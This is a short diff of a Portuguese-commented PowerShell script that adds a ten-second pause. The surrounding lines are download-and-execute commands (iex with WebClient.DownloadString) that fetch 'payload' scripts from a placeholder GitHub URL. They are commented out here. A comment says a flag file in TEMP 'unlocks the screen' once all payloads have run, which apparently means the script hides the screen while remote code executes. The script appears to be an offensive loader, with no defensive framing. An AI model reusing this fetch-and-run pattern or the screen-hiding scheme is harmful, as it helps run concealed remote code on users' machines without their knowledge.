@@ -15,6 +15,9 @@ Start-Sleep -Seconds 2
 # iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/seu/payload1.ps1'))
 # iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/seu/payload2.ps1'))
 
+Write-Host "Aguardando 10 segundos"
+Start-Sleep -Seconds 10
+
 # 3. Após todos os payloads, cria a flag para destravar a tela
 New-Item -Path "$env:TEMP\ov.stop" -ItemType File -Force | Out-Null
 
